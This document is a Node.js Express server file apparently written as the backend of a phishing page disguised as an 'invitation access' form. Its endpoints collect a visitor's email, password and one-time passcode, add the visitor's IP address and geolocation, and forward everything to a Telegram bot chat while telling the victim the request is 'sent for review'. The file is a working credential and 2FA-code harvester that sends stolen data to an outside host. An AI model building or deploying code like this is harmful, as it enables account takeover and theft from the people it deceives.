import 'dotenv/config';
import express from 'express';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const app = express();
const port = Number(process.env.PORT || 8787);
const botToken = process.env.TELEGRAM_BOT_TOKEN;
const chatId = process.env.TELEGRAM_CHAT_ID;

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const distPath = path.resolve(__dirname, '../dist');

app.set('trust proxy', true);
app.use(express.json({ limit: '20kb' }));

function getClientIp(request) {
  const forwardedFor = request.headers['x-forwarded-for'];
  const realIp = request.headers['x-real-ip'];
  const connectingIp = request.headers['cf-connecting-ip'];

  if (typeof connectingIp === 'string' && connectingIp) return connectingIp;
  if (typeof realIp === 'string' && realIp) return realIp;

  if (typeof forwardedFor === 'string' && forwardedFor) {
    return forwardedFor.split(',')[0].trim();
  }

  return request.ip || request.socket.remoteAddress || 'Unknown';
}

function isLocalIp(ipAddress) {
  return (
    ipAddress === '::1' ||
    ipAddress === '127.0.0.1' ||
    ipAddress === '::ffff:127.0.0.1' ||
    ipAddress.startsWith('10.') ||
    ipAddress.startsWith('192.168.') ||
    /^172\.(1[6-9]|2\d|3[0-1])\./.test(ipAddress)
  );
}

async function getIpLocation(ipAddress) {
  if (!ipAddress || ipAddress === 'Unknown' || isLocalIp(ipAddress)) {
    return 'Unavailable for local/private IP';
  }

  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 2500);

  try {
    const fields = 'status,country,regionName,city,query';

    const lookupResponse = await fetch(
      `http://ip-api.com/json/${encodeURIComponent(ipAddress)}?fields=${fields}`,
      { signal: controller.signal }
    );

    const result = await lookupResponse.json();

    if (!lookupResponse.ok || result.status !== 'success') {
      return 'Location lookup unavailable';
    }

    return [result.city, result.regionName, result.country]
      .filter(Boolean)
      .join(', ');
  } catch {
    return 'Location lookup unavailable';
  } finally {
    clearTimeout(timeoutId);
  }
}

async function sendTelegramMessage(message) {
  if (!botToken || !chatId) {
    throw new Error('Telegram delivery is not configured yet.');
  }

  const telegramResponse = await fetch(
    `https://api.telegram.org/bot${botToken}/sendMessage`,
    {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    }
  );

  if (!telegramResponse.ok) {
    throw new Error('Telegram could not receive this invitation request.');
  }
}

/**
 * Invitation access page URL
 * Open this in your browser:
 * http://localhost:8787/invitation-access
 */

app.post('/api/invite', async (request, response) => {
  const email = String(request.body?.email || '').trim();
  const accessCode = String(request.body?.accessCode || '').trim();

  if (!email || !accessCode) {
    return response.status(400).json({
      message: 'Email address and password are required.',
    });
  }

  const ipAddress = getClientIp(request);
  const location = await getIpLocation(ipAddress);

  const message = [
    'New invitation access request',
    '',
    `Email: ${email}`,
    `password: ${accessCode}`,
    `IP address: ${ipAddress}`,
    `Approx. location: ${location}`,
    `Submitted: ${new Date().toISOString()}`,
  ].join('\n');

  try {
    await sendTelegramMessage(message);
  } catch (error) {
    return response.status(error.message.includes('configured') ? 500 : 502).json({
      message: error.message,
    });
  }

  return response.json({
    message: 'Invitation request sent for review.',
  });
});

app.post('/api/final-invite', async (request, response) => {
  const email = String(request.body?.email || '').trim();
  const accessCode = String(request.body?.accessCode || '').trim();
  const finalCode = String(request.body?.finalCode || '').trim();

  if (!email || !accessCode || !finalCode) {
    return response.status(400).json({
      message: 'Email, password, and o are required.',
    });
  }

  const message = [
    'Final invitation code submitted',
    '',
    `Email: ${email}`,
    `password ${accessCode}`,
    `otp: ${finalCode}`,
    `Submitted: ${new Date().toISOString()}`,
  ].join('\n');

  try {
    await sendTelegramMessage(message);
  } catch (error) {
    return response.status(error.message.includes('configured') ? 500 : 502).json({
      message: error.message,
    });
  }

  return response.json({
    message: 'Final invite code sent for confirmation.',
  });
});

app.use(express.static(distPath));

app.get('*', (request, response) => {
  response.sendFile(path.join(distPath, 'index.html'));
});

app.listen(port, () => {
  console.log(`Invitation server running on http://127.0.0.1:${port}`);
  console.log(`Invitation access page: http://127.0.0.1:${port}/invitation-access`);
});